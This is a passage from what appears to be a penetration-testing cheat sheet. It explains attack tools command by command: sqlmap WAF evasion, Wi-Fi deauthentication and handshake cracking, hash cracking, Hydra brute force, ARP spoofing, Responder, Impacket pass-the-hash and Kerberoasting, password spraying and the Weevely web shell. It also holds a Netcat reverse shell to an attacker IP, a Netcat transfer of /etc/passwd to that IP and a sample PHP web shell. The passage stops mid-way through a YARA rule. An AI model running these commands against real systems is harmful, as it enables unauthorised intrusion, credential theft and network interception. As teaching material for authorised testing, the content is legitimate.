| `--tamper=space2comment` | Apply tamper script | Replaces spaces with SQL comments `/**/` to bypass WAF (Web Application Firewall). Many WAFs block `SELECT * FROM` but not `SELECT/**/*/**/FROM`. |
| `--random-agent` | Random User-Agent | Changes browser identification header each request — avoids WAF blocking SQLmap's default user-agent string. |

```bash
sqlmap -u "http://target.com/?id=1" \
       --batch \
       --timeout=10 \
       --retries=3
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `--batch` | Non-interactive | Auto-answers all prompts with default answer. Essential for scripting/automation. |
| `--timeout=10` | Request timeout | Wait max 10 seconds for response. Prevents hanging on slow targets. |
| `--retries=3` | Retry failed requests | Retry 3 times before giving up. Handles unstable connections. |

---

## 8. Burp Suite — Web Proxy

**What is Burp Suite?**
Burp Suite sits between your browser and the web server, capturing every HTTP/HTTPS request and response. You can then modify, replay, and analyze all web traffic manually.

**How it works:**
```
Browser → Burp Suite (8080) → Internet → Web Server
                    ↑
              You see and modify EVERYTHING here
```

**Setting up (do this once):**
```
1. Start Burp Suite
2. Proxy tab → Options → Listener on 127.0.0.1:8080
3. In Firefox: Preferences → Network → Manual Proxy → HTTP: 127.0.0.1 Port: 8080
4. Visit http://burp → Download CA certificate
5. Firefox → Preferences → Certificates → Import → trust for websites
```

**Proxy — Intercept Mode:**
```
Intercept ON:  Every request STOPS and waits for you to:
               - Forward it (send as-is)
               - Drop it (block it)
               - Edit it then forward
WHY: Manually modify form submissions, cookie values, hidden fields

Intercept OFF: Requests flow through automatically but are logged in HTTP History
WHY: Browse normally to map the site, then go back and test specific requests
```

**Repeater — Manual Testing:**
```
Right-click any request in HTTP History → Send to Repeater

In Repeater:
→ Modify any part of the request (parameters, headers, body)
→ Click Send
→ See response instantly
→ Modify again and send again

WHY: Test SQL injection by changing ?id=1 to ?id=1'
     Test XSS by inserting <script>alert(1)</script> in parameters
     Test authentication by changing user_id=100 to user_id=101 (IDOR)
```

**Intruder — Automated Attacks:**
```
Send request to Intruder → mark injection points with §§

Attack Types:
→ Sniper:     One wordlist, one position at a time (password brute force)
→ Battering:  Same payload to ALL positions simultaneously
→ Pitchfork:  Multiple lists, one item from each per request (user+pass pairs)
→ Cluster bomb: Every combination of all lists (slow but thorough)

WHY: Brute force login forms, fuzz parameters, test payloads across all inputs
```

**Decoder:**
```
Paste encoded text → decode/encode:
→ Base64: dXNlcjpwYXNz → user:pass
→ URL encoding: %3Cscript%3E → <script>
→ HTML entities: &lt;script&gt; → <script>
→ Hex, Gzip, etc.

WHY: JWT tokens, cookies, and responses often use encoding — decode to read/modify them
```

---

## 9. Gobuster — Directory Brute Force

**What is Gobuster?**
Gobuster tries thousands of common directory and file names against a web server to discover hidden paths not linked from the main site — admin panels, config files, backup files, API endpoints.

```bash
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
```
| Part | Meaning | WHY |
|------|---------|-----|
| `dir` | Directory mode | Brute-force directories and files |
| `-u http://target.com` | URL target | The website to enumerate |
| `-w /usr/share/wordlists/dirb/common.txt` | Wordlist | File containing directory names to try (common.txt has ~4600 entries) |

**What happens:** Gobuster tries `http://target.com/admin`, `http://target.com/login`, `http://target.com/.git/`, etc. — records which ones return 200 OK or 301 redirect (indicating they exist).

---

```bash
gobuster dir -u http://target.com \
             -w /usr/share/seclists/Discovery/Web-Content/big.txt \
             -t 50 \
             -x php,html,txt,bak \
             -o results.txt \
             -s 200,301,302,403
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `-t 50` | 50 threads | Run 50 simultaneous requests instead of 1. Makes scan 50x faster. |
| `-x php,html,txt,bak` | File extensions | Also try `admin.php`, `admin.html`, `admin.txt`, `admin.bak` for each word. Finds backup files developers left behind. |
| `-o results.txt` | Output to file | Save results to file for reference later. |
| `-s 200,301,302,403` | Status codes to show | 200=found, 301/302=redirect(also found), 403=forbidden(exists but restricted — still interesting) |

---

```bash
gobuster dns -d target.com \
             -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
             -t 30
```
| Part | Meaning | WHY |
|------|---------|-----|
| `dns` | DNS mode | Enumerate subdomains instead of directories |
| `-d target.com` | Domain | The base domain to find subdomains for |
| `-w subdomains...` | Subdomain wordlist | Tries `admin.target.com`, `dev.target.com`, `api.target.com`, etc. |

WHY: Hidden subdomains often run dev/staging/admin versions of apps with weaker security.

---

```bash
gobuster vhost -u http://target.com \
               -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
               --append-domain
```
| Part | Meaning | WHY |
|------|---------|-----|
| `vhost` | Virtual host mode | Finds virtual hosts on the SAME IP. Many servers host multiple sites on one IP using different hostnames. |
| `--append-domain` | Add base domain | Appends `.target.com` to each word automatically |

---

## 10. Aircrack-ng Suite — Wi-Fi Auditing

**The Suite Components and Why Each Exists:**

```bash
sudo airmon-ng check kill
```
| Part | Meaning | WHY Critical |
|------|---------|-------------|
| `airmon-ng` | Wireless interface manager | Controls monitor mode |
| `check kill` | Check and kill conflicts | NetworkManager and wpa_supplicant compete for the wireless card. If they're running, they'll interfere with packet injection/capture. This kills them. Always run FIRST. |

```bash
sudo airmon-ng start wlan0
```
| Part | Meaning | WHY |
|------|---------|-----|
| `start wlan0` | Enable monitor mode | Changes wlan0 from "managed" mode (connects to APs) to "monitor" mode (listens to ALL packets in range, any network). Creates `wlan0mon` interface. |

**Two Wi-Fi modes:**
```
Managed mode:  Your card connects to ONE specific AP. Only sees your own traffic.
Monitor mode:  Your card listens to EVERYTHING. Sees all APs and all clients in range.
WHY monitor mode: Need to see WPA handshakes, capture packets from any network
```

---

```bash
sudo airodump-ng wlan0mon
```
| Part | Meaning | WHY |
|------|---------|-----|
| `airodump-ng` | Wireless packet capture | Scans and displays all nearby Wi-Fi networks |
| `wlan0mon` | Monitor mode interface | Uses the monitoring interface we created |

**Output columns explained:**
```
BSSID             = MAC address of the Access Point (router)
PWR               = Signal strength (-30 best, -90 worst)
Beacons           = Number of beacon frames seen (confirms AP is active)
#Data             = Number of data packets captured (higher = more traffic)
#/s               = Data packets per second
CH                = Channel the AP operates on (1-14)
MB                = Maximum speed supported
ENC               = Encryption type (WPA2, WPA, WEP, OPN)
CIPHER            = Cipher used (CCMP=AES, TKIP=older)
AUTH              = Authentication (PSK=password, MGT=enterprise/RADIUS)
ESSID             = Network name (Wi-Fi name you see when connecting)
```

```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `-c 6` | Lock to channel 6 | Stop hopping channels. Stay on the target AP's channel to not miss packets. |
| `--bssid AA:...` | Target specific AP | Only capture traffic from this specific router MAC. Filters out noise from other networks. |
| `-w capture` | Write to files | Saves capture as capture-01.cap, capture-01.csv, etc. |

**Waiting for WPA handshake:**
```
WPA handshake happens when a CLIENT (phone/laptop) CONNECTS to the AP.
Capture contains: Client's attempted login = the password hash we want to crack.
Wait for natural connection OR force one with deauth attack below.
```

---

```bash
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
```
| Part | Meaning | WHY |
|------|---------|-----|
| `aireplay-ng` | Packet injection tool | Injects crafted packets into the wireless network |
| `-0 10` | Deauthentication attack, 10 packets | Sends fake "disconnect" packets to all clients on the AP. Client disconnects then immediately reconnects — generating a WPA handshake we can capture. |
| `-a AA:...` | Target AP MAC | Only deauth clients of this specific AP |

---

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```
| Part | Meaning | WHY |
|------|---------|-----|
| `-w rockyou.txt` | Wordlist file | Dictionary to try against the captured handshake |
| `capture-01.cap` | Captured handshake file | The .cap file containing the WPA handshake |

**What happens:** For each password in rockyou.txt, aircrack-ng computes the WPA key and compares to the captured handshake. If they match → PASSWORD FOUND.

```bash
hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt
```
WHY use hashcat instead: GPU-accelerated cracking — tries millions of passwords per second vs thousands with aircrack-ng CPU-only.

---

## 11. Hashcat — Hash Cracking

**What is a hash?**
A hash is a one-way mathematical function: `password123` → `482c811da5d5b4bc6d497ffa98491e38`. You can't reverse it. To crack it, you must hash many words and compare results.

```bash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `-m 0` | Hash mode 0 = MD5 | Tell hashcat what algorithm produced this hash. Wrong mode = wrong calculation = never finds password. |
| `-a 0` | Attack mode 0 = Dictionary | Try every password in the wordlist file. |
| `hash.txt` | File with hash(es) | One hash per line. Can crack thousands simultaneously. |
| `rockyou.txt` | Wordlist | 14 million real passwords from the RockYou data breach. Real users choose real passwords from this list. |

**Essential hash modes (memorize these):**
```
-m 0      MD5              (most web apps)
-m 100    SHA1
-m 1400   SHA-256
-m 1800   sha512crypt      (Linux /etc/shadow)
-m 1000   NTLM             (Windows passwords)
-m 3200   bcrypt           (modern web apps — very slow to crack)
-m 13100  Kerberos 5 TGS   (from Kerberoasting)
-m 22000  WPA-PBKDF2       (Wi-Fi passwords)
-m 5600   NetNTLMv2        (from Responder captures)
```

---

```bash
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a?a?a
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `-a 3` | Brute force attack | Try every possible character combination |
| `?a?a?a?a?a?a?a?a` | Mask = 8 chars, all types | Each `?a` = one character from: lowercase + uppercase + digits + symbols. 8 positions = tries all 8-char passwords. |

**Mask characters:**
```
?l = lowercase (a-z)
?u = uppercase (A-Z)
?d = digits (0-9)
?s = symbols (!@#$...)
?a = all of the above combined
?h = hex chars (0-9, a-f)
```

```bash
hashcat -m 0 -a 3 hash.txt ?u?l?l?l?d?d?d?d
```
WHY: Many passwords follow patterns: Capital letter + 3 lowercase + 4 digits (e.g., "John2024"). This mask targets that exact pattern efficiently.

---

```bash
hashcat -m 1000 -a 0 hash.txt rockyou.txt \
        -r /usr/share/hashcat/rules/best64.rule
```
| Flag | Meaning | WHY (Most Effective Attack!) |
|------|---------|------------------------------|
| `-r best64.rule` | Apply rules | Takes each wordlist word and applies 64 transformations: capitalize, add numbers, substitute letters (a→@, e→3), append years, etc. "password" becomes "Password", "password1", "p@ssword", "PASSWORD", etc. Rule-based attacks crack FAR more passwords than pure dictionary. |

---

```bash
hashcat -m 0 -a 1 hash.txt wordlist1.txt wordlist2.txt
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `-a 1` | Combinator attack | Combines words from two lists: "sun" + "shine" = "sunshine". Effective for compound passwords. |

---

```bash
hashcat -b -m 0
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `-b` | Benchmark | Tests your hardware's cracking speed for MD5. Output: "Speed: 15000 MH/s" means 15 billion MD5 hashes per second. Helps you estimate how long cracking will take. |

```bash
hashcat --show hash.txt
```
WHY: After cracking, shows all cracked hashes with plaintext passwords. Results are saved in hashcat.potfile automatically.

---

## 12. John the Ripper — Password Cracking

**John vs Hashcat:**
- John: CPU-based, auto-detects hash types, handles file formats (zip, PDF, SSH keys)
- Hashcat: GPU-based, much faster for raw hash cracking

```bash
john hashes.txt
```
WHY: Simplest use — John auto-identifies the hash type and starts cracking using its built-in word list + rules. Good for quick tests.

```bash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
WHY: Use the massive rockyou wordlist instead of John's smaller default.

```bash
john hashes.txt --wordlist=rockyou.txt --rules=KoreLogic
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `--rules=KoreLogic` | Apply rule set | KoreLogic is a powerful rule set that applies hundreds of password mutations. More effective than default rules. |

```bash
john --show hashes.txt
```
WHY: Display all previously cracked passwords. John stores results in john.pot file.

---

**Cracking specific file types — John's superpower:**

```bash
zip2john protected.zip > zip.hash
john zip.hash --wordlist=rockyou.txt
```
WHY: John converts ZIP password protection into a crackable hash format, then cracks it. Same for RAR, 7z, Office documents.

```bash
ssh2john id_rsa > ssh.hash
john ssh.hash --wordlist=rockyou.txt
```
WHY: Crack the passphrase protecting a stolen SSH private key. Once cracked, you can use the key to log into servers.

```bash
pdf2john protected.pdf > pdf.hash
john pdf.hash
```

```bash
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=rockyou.txt
```
| Part | Meaning | WHY |
|------|---------|-----|
| `unshadow` | Combine passwd and shadow | Linux stores usernames in /etc/passwd and password hashes in /etc/shadow. John needs both combined to know which hash belongs to which user. |

---

## 13. Hydra — Online Brute Force

**What is Hydra?**
Hydra attempts to login to LIVE services (SSH, FTP, web login, RDP, etc.) by trying username/password combinations. Unlike hashcat which cracks offline hashes, Hydra attacks live services.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com
```
| Part | Meaning | WHY |
|------|---------|-----|
| `-l admin` | Single username | Try only "admin" as username (lowercase -l = single) |
| `-P rockyou.txt` | Password list (uppercase = file) | Try every password in this file |
| `ssh://target.com` | Protocol://target | Attack SSH service on target.com |

**Login flag reference:**
```
-l username    → Single username
-L users.txt   → Username list (file)
-p password    → Single password
-P passes.txt  → Password list (file)
```

---

```bash
hydra -L users.txt -P passes.txt ftp://192.168.1.100 -t 4 -V
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `-L users.txt` | Username list | Try each username in file |
| `-t 4` | 4 threads | Number of parallel connections. SSH/FTP: use 4 max (more causes connection errors/bans) |
| `-V` | Verbose | Show each attempt. Slower but lets you see progress and catch which credentials worked. |

---

```bash
hydra -l admin -P rockyou.txt target.com \
     http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```
| Part | Meaning | WHY |
|------|---------|-----|
| `http-post-form` | Attack web login form | Submits login attempts as HTTP POST requests |
| `"/login.php:..."` | Three-part argument | Path : POST data : Failure string |
| `^USER^` | Username placeholder | Hydra inserts username here for each attempt |
| `^PASS^` | Password placeholder | Hydra inserts password here |
| `"Invalid credentials"` | Failure indicator | Text that appears on FAILED login. Hydra looks for this — if NOT found, it assumes login succeeded. |

WHY: Web login forms vary wildly. You need to tell Hydra exactly: what URL, what parameters, and how to detect failure.

```bash
hydra -l administrator -P rockyou.txt rdp://target.com -t 1 -W 3
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `rdp://` | Target RDP | Windows Remote Desktop Protocol |
| `-t 1` | 1 thread only | RDP bans IPs quickly — slow down to avoid lockout |
| `-W 3` | Wait 3 seconds | Additional wait between attempts |

---

## 14. Wireshark / tshark — Packet Analysis

**What is Wireshark?**
Every network communication is made of packets. Wireshark captures these packets and lets you decode them — seeing EXACTLY what data was transmitted, including plaintext credentials in unencrypted protocols.

```bash
sudo wireshark
```
WHY sudo: Capturing raw packets requires root access to network interfaces.

**Wireshark Display Filters (typed in the filter bar):**

```
http                    → Show only HTTP traffic
http.request            → Show only HTTP requests
http.request.method == "POST"  → Show only POST requests (form submissions, logins)
tcp.port == 21          → FTP traffic (port 21)
tcp.port == 22          → SSH traffic
tcp.port == 3306        → MySQL database traffic
ip.addr == 10.10.10.1   → Traffic to/from specific IP
ip.src == 10.10.10.1    → Traffic FROM specific IP only
ip.dst == 10.10.10.1    → Traffic TO specific IP only
dns                     → DNS queries/responses
ftp                     → FTP (credentials often in plaintext!)
telnet                  → Telnet (everything in plaintext!)
```

**Finding credentials in captures:**
```
FTP: Filter "ftp" → look for USER and PASS commands (plaintext!)
HTTP Basic Auth: Filter "http" → look for Authorization header → decode Base64
HTTP POST: Filter "http.request.method==POST" → check form data for passwords
Telnet: Filter "telnet" → everything visible in plaintext
```

---

```bash
tshark -i eth0 -w capture.pcap
```
| Part | Meaning | WHY |
|------|---------|-----|
| `tshark` | CLI version of Wireshark | Use when no GUI available (SSH sessions, scripts) |
| `-i eth0` | Interface to capture on | eth0 = wired, wlan0 = wireless, tun0 = VPN |
| `-w capture.pcap` | Write to file | Save for later analysis in Wireshark |

```bash
tshark -r capture.pcap -Y "http.request.method == POST" -T fields \
       -e http.host -e http.request.uri -e http.file_data
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `-r capture.pcap` | Read from file | Analyze saved capture |
| `-Y "filter"` | Display filter | Apply Wireshark filter |
| `-T fields` | Output as fields | Tab-separated field output |
| `-e http.host` | Extract host field | Print only these specific fields |

WHY: Extract specific data from large captures without opening GUI — great for automation and reports.

---

## 15. Netcat — Swiss Army Knife

**What is Netcat?**
Netcat is the simplest tool for creating TCP/UDP connections. It can read/write raw network data. It's used for: reverse shells, bind shells, file transfers, port scanning, banners, and testing.

```bash
nc -lvnp 4444
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `-l` | Listen mode | Wait for incoming connection (server mode) |
| `-v` | Verbose | Show connection details when client connects |
| `-n` | No DNS resolution | Don't resolve IP to hostname (faster, no DNS lookups) |
| `-p 4444` | Port 4444 | Listen on port 4444 |

WHY: This is your **reverse shell listener**. You run this on YOUR machine. When victim runs the reverse shell payload, they connect to your port 4444 and you get a shell.

---

```bash
nc 10.10.14.5 4444 -e /bin/bash
```
| Part | Meaning | WHY |
|------|---------|-----|
| `nc 10.10.14.5 4444` | Connect to attacker IP:port | Victim's machine connects BACK to you |
| `-e /bin/bash` | Execute bash after connecting | Sends bash shell through the connection — attacker gets interactive bash |

---

```bash
# File transfer with Netcat:

# On receiver (attacker):
nc -lvnp 4444 > received_file.txt

# On sender (victim):
nc 10.10.14.5 4444 < /etc/passwd
```
WHY: Transfer files without SCP/FTP. Useful when victim has nc but not other tools.

```bash
# Port scanning (basic):
nc -zv target.com 80 443 8080
```
| Flag | Meaning |
|------|---------|
| `-z` | Zero I/O mode (scan only, don't send data) |
| `-v` | Verbose (show open/closed for each port) |

```bash
# Banner grabbing (see what service is running):
nc target.com 21
nc target.com 22
nc target.com 25
```
WHY: Connecting to a port often makes the service send a "banner" — version information. `220 ProFTPD 1.3.5 Server` reveals FTP version to search for CVEs.

---

## 16. Bettercap — Network Attacks

**What is Bettercap?**
Bettercap is a comprehensive framework for man-in-the-middle attacks. It can: discover hosts, ARP spoof (redirect traffic through you), sniff credentials, inject content into pages, attack Wi-Fi, and probe Bluetooth.

```bash
sudo bettercap -iface eth0
```
WHY: Start bettercap on the ethernet interface. Opens interactive console.

**Inside bettercap console:**

```
net.probe on
```
WHY: Actively probes the network by sending ARP packets to discover all hosts. Shows you who's on the network.

```
net.show
```
WHY: Display all discovered hosts with IP, MAC, hostname. Identify your targets.

```
set arp.spoof.targets 192.168.1.50
arp.spoof on
```
| Command | What It Does | WHY |
|---------|-------------|-----|
| `set arp.spoof.targets` | Set target IP | Only ARP spoof this specific device (not everyone) |
| `arp.spoof on` | Start ARP spoofing | Sends fake ARP replies to: victim (telling them your MAC = gateway) AND gateway (telling it your MAC = victim). Now ALL victim traffic flows through YOUR machine = Man in the Middle. |

```
net.sniff on
```
WHY: With ARP spoofing active, sniff all intercepted traffic. Captures plaintext credentials from HTTP, FTP, Telnet.

```
https.proxy on
```
WHY: Enables SSL stripping / HTTPS downgrade proxy. Some sites can be downgraded from HTTPS to HTTP, making credentials visible.

```
wifi.recon on
wifi.show
```
WHY: Scan for Wi-Fi networks. Shows SSID, BSSID, channel, clients connected.

---

## 17. Responder — Credential Capture

**What is Responder?**
When a Windows computer can't find a hostname via DNS, it broadcasts a request using LLMNR/NBT-NS protocols asking "does anyone know where 'fileserver' is?" Responder answers these broadcasts, captures the authentication attempt, and receives NTLMv2 hash — without any interaction from the user.

```bash
sudo responder -I eth0
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `-I eth0` | Listen on ethernet | Monitor this interface for name resolution broadcasts |

**What happens automatically:**
```
Windows PC trying to access \\nonexistent-share:
1. PC asks DNS: "where is 'nonexistent-share'?" → DNS: "don't know"
2. PC broadcasts LLMNR: "Anyone know 'nonexistent-share'?"
3. Responder answers: "Yes, I'm 'nonexistent-share', authenticate to me"
4. Windows automatically sends NTLMv2 authentication hash
5. Responder captures and logs the hash

You get: VICTIM\username NTLMv2 hash → crack with hashcat -m 5600
```

```bash
sudo responder -I eth0 -w -d
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `-w` | Enable WPAD (proxy) | Responds to WPAD proxy discovery — captures browser credentials |
| `-d` | Enable DHCP | Responds to DHCP requests — provides rogue DNS settings |

**Cracking captured hashes:**
```bash
hashcat -m 5600 /usr/share/responder/logs/NTLMv2-hash.txt rockyou.txt
# -m 5600 = NTLMv2 hash type
```

---

## 18. Impacket Suite — Windows/AD Attacks

**What is Impacket?**
Python library + tools for interacting with Windows protocols (SMB, LDAP, Kerberos, DCOM). Lets Linux machines attack Windows/Active Directory environments without needing a Windows machine.

```bash
psexec.py domain/administrator:Password123@10.10.10.1
```
| Part | Meaning | WHY |
|------|---------|-----|
| `psexec.py` | PSExec tool | Remote execution via SMB service creation |
| `domain/administrator` | Domain\User | Authentication as this user |
| `:Password123` | Password | Credentials |
| `@10.10.10.1` | Target IP | Run commands on this machine |

WHY: When you have valid admin credentials, psexec gives you a SYSTEM shell on the remote machine via SMB without RDP.

```bash
psexec.py -hashes :NTLM_HASH_HERE administrator@10.10.10.1
```
WHY: **Pass-the-Hash** — use stolen NTLM hash directly WITHOUT knowing the plaintext password. The `-hashes :NTLM` format is LM_hash:NTLM_hash (LM can be blank).

---

```bash
secretsdump.py domain/administrator:Password123@10.10.10.1
```
WHY: Dumps ALL credentials from a Windows system: SAM database (local hashes), LSA secrets, cached domain hashes, NTDS.dit hashes (if run against DC = dumps ALL domain user hashes).

---

```bash
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.1 -request
```
| Part | Meaning | WHY (Kerberoasting) |
|------|---------|---------------------|
| `GetUserSPNs.py` | Kerberoasting tool | Requests Kerberos service tickets for accounts with SPNs |
| `-request` | Get the actual tickets | Without this, just lists accounts. With this, gets crackable TGS tickets. |

WHY: Any domain user can request service tickets. These tickets are encrypted with the SERVICE ACCOUNT's password hash. Extract them → crack offline → get service account password.

```bash
hashcat -m 13100 kerberoast_hashes.txt rockyou.txt
```

---

```bash
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.1
```
WHY: **AS-REP Roasting** — finds accounts with "Pre-auth not required" setting. These accounts' password hashes can be requested without knowing the password. Get hash → crack → get account.

```bash
hashcat -m 18200 asrep_hashes.txt rockyou.txt
```

---

## 19. BloodHound — AD Mapping

**What is BloodHound?**
BloodHound collects AD data (users, groups, computers, permissions, sessions) and graphs ATTACK PATHS — the shortest route from any user to Domain Admin, visualized as a graph.

```bash
sudo neo4j console &    # Start database
bloodhound &            # Start GUI
```

**Data collection (on Windows target with SharpHound):**
```powershell
# Run on compromised Windows machine:
.\SharpHound.exe -c All    # Collect all data types
# Creates: 20241201_BloodHound.zip
```

**Import to BloodHound:** Drag and drop the ZIP into the BloodHound interface.

**Key queries to run (in BloodHound search):**
```
"Find Shortest Paths to Domain Admins"
→ WHY: Shows EXACT steps: compromised user → X → Y → Domain Admin
        Each arrow is an exploitable relationship

"Find All Domain Admins"
→ WHY: See who has DA privs — these are your targets AND threats

"List All Kerberoastable Accounts"
→ WHY: Find service accounts with SPNs (vulnerable to Kerberoasting)

"Find AS-REP Roastable Users"
→ WHY: Find accounts without Kerberos pre-auth (easy hash extraction)

"Find Computers with Unconstrained Delegation"
→ WHY: These can be abused to impersonate ANY user including Domain Admins
```

---

## 20. Nikto — Web Server Scanner

```bash
nikto -h http://target.com
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `-h` | Host/URL | Target web server to scan |

WHY: Nikto checks for 6700+ dangerous files/CGI, outdated software, server misconfigurations, and security headers. Good for fast automated checks.

```bash
nikto -h http://target.com -p 8080,8443
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `-p 8080,8443` | Specific ports | Target runs on non-standard ports — specify them |

```bash
nikto -h http://target.com -ssl
```
Scan HTTPS target (force SSL).

```bash
nikto -h http://target.com -Tuning 4
```
| Tuning value | Tests |
|-------------|-------|
| 1 | Interesting files |
| 2 | Misconfiguration |
| 3 | Information disclosure |
| 4 | Injection attacks |
| 5 | Remote file retrieval |
| 6 | Denial of Service |
| 9 | SQL injection |
| x | Reverse tuning (exclude) |

```bash
nikto -h http://target.com -o report.html -Format html
```
WHY: Save report as formatted HTML for easy reading and client reporting.

---

## 21. theHarvester — OSINT

**What is theHarvester?**
Searches public sources (Google, Bing, LinkedIn, Shodan, etc.) to collect email addresses, employee names, subdomains, IP ranges, and other information about a target organization — WITHOUT touching the target directly.

```bash
theHarvester -d target.com -b google
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `-d target.com` | Domain | The organization to research |
| `-b google` | Source: Google | Use Google's search results to find info |

```bash
theHarvester -d target.com -b all -l 500 -f output.html
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `-b all` | All sources | Use every available source: Google, Bing, Yahoo, LinkedIn, Shodan, VirusTotal, etc. |
| `-l 500` | Limit results | Get up to 500 results per source |
| `-f output.html` | Save to HTML | Creates readable report with all findings |

**What you find:**
```
Emails:     john.smith@company.com, admin@company.com
            → Use for phishing, LinkedIn OSINT, credential spray
Hostnames:  mail.company.com, vpn.company.com, dev.company.com
            → New attack surface to test
IPs:        203.0.113.0/24
            → Company's IP range
```

---

## 22. Proxychains4 — Traffic Routing

**What is Proxychains?**
Makes ANY tool's traffic go through a proxy (like Tor or a SOCKS proxy). The tool doesn't need proxy support — proxychains intercepts connections at the system level.

```bash
sudo nano /etc/proxychains4.conf
```
**Understanding the config file:**
```
# At top — choose chain type:
strict_chain      → Use ALL proxies in order. If one fails, entire connection fails.
dynamic_chain     → Skip failed proxies. More reliable.
random_chain      → Random order each time. Better anonymization.

# At bottom — add your proxies:
socks5 127.0.0.1 9050   → Tor SOCKS5 proxy (when Tor is running)
socks4 proxy.example.com 1080 → External SOCKS4 proxy
http   proxy.example.com 8080 → HTTP proxy
```

```bash
proxychains4 nmap -sT target.com
```
WHY `-sT` not `-sS`: SYN scan sends raw packets — proxychains can't proxy raw packets. Must use `-sT` (TCP connect) which uses the OS network stack that proxychains can intercept.

```bash
proxychains4 sqlmap -u "http://target.com/?id=1"
proxychains4 hydra -l admin -P pass.txt ssh://target.com
proxychains4 firefox
```
WHY: Every tool automatically routes through Tor. Target only sees Tor exit node IP.

---

## 23. Netexec — Windows Network

```bash
netexec smb 192.168.1.0/24
```
WHY: Discover all Windows machines on the network and their info (hostname, OS, SMB signing status, domain).

```bash
netexec smb 192.168.1.1 -u administrator -p Password123
```
WHY: Test if credentials are valid. Returns `[+]` (valid) or `[-]` (invalid).

```bash
netexec smb 192.168.1.0/24 -u administrator -p Password123 --continue-on-success
```
WHY: **Password spraying** — test ONE password across an entire network range. Finds all machines where these creds work.

```bash
netexec smb target.com -u admin -p pass --shares
```
WHY: List all SMB shares on target. Look for: `READ` access to sensitive shares.

```bash
netexec smb target.com -u admin -p pass --sam
```
WHY: Dump SAM database (local user hashes) — requires admin privileges.

```bash
netexec smb target.com -u admin -p pass -x "whoami /all"
```
WHY: Execute command on remote Windows system. Confirms you have code execution.

```bash
netexec smb target.com -u admin -H NTLM_HASH
```
WHY: **Pass-the-Hash** — authenticate with hash instead of password.

---

## 24. Weevely — Web Shell

```bash
weevely generate secretpassword /var/www/html/shell.php
```
| Part | Meaning | WHY |
|------|---------|-----|
| `generate` | Create a new shell | Generates obfuscated PHP |
| `secretpassword` | Authentication password | Shell only responds to requests with this password — others get 404 |
| `/var/www/html/shell.php` | Output path | Where to save the generated shell file |

WHY it's obfuscated: Normal web shells look like `<?php system($_GET['cmd']); ?>` — every antivirus flags this. Weevely splits the code across many variables and uses base64/XOR encoding — harder to detect.

```bash
weevely http://target.com/uploads/shell.php secretpassword
```
WHY: Connect to the deployed shell. Opens interactive session.

**Inside weevely shell:**
```bash
:help                    → List all available modules
:file.ls /               → List root directory
:file.read /etc/passwd   → Read sensitive files
:system.info             → Get OS, web server, PHP version info
:net.scan 192.168.1.0/24 → Network scan FROM the target machine (pivoting!)
:sql.console             → Interactive MySQL console if DB credentials found
```

---

## 25. Wifite — Automated Wi-Fi

```bash
sudo wifite
```
WHY: Wifite automates the ENTIRE Wi-Fi attack process — scans networks, selects targets, captures handshakes, attacks WPS, and cracks passwords. You just watch.

```bash
sudo wifite --wpa --dict /usr/share/wordlists/rockyou.txt
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `--wpa` | Target WPA networks only | Skip WEP (too old) and open networks |
| `--dict rockyou.txt` | Wordlist for cracking | After capturing handshake, immediately try this wordlist |

```bash
sudo wifite --bssid AA:BB:CC:DD:EE:FF --channel 6
```
WHY: Skip scanning phase, go directly to attacking this specific known network.

```bash
sudo wifite --wps
```
WHY: Target only WPS-enabled routers (vulnerable to PIN brute force and Pixie Dust attack).

---

## 27. YARA — Pattern Matching

```bash
yara rules.yar suspicious_file.exe
```
| Part | Meaning | WHY |
|------|---------|-----|
| `rules.yar` | YARA rule file | Contains patterns to look for (strings, byte sequences) |
| `suspicious_file.exe` | File to scan | The file to check against rules |

```bash
yara -r rules.yar /suspicious/directory/
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `-r` | Recursive | Scan entire directory tree |

```bash
yara -s rules.yar malware.exe
```
| Flag | Meaning | WHY |
|------|---------|-----|
| `-s` | Show matching strings | Print which specific strings in the rule matched — helpful for understanding WHY it flagged |

**Writing a YARA rule (explained):**
```yara
rule FindMimikatz {
    // 'meta' = documentation (doesn't affect detection)
    meta:
        description = "Detects Mimikatz password dumper"
        severity = "critical"
    
    // 'strings' = what patterns to look for
    strings:
        $str1 = "mimikatz" nocase          // "nocase" = case-insensitive
        $str2 = "sekurlsa::logonpasswords" // Exact string match
        $hex1 = { 4D 69 6D 69 6B 61 74 7A } // Hex bytes for "Mimikatz"
        $re1  = /lsadump::[a-z]+/          // Regex: any lsadump command
    
    // 'condition' = when to fire the rule
    condition:
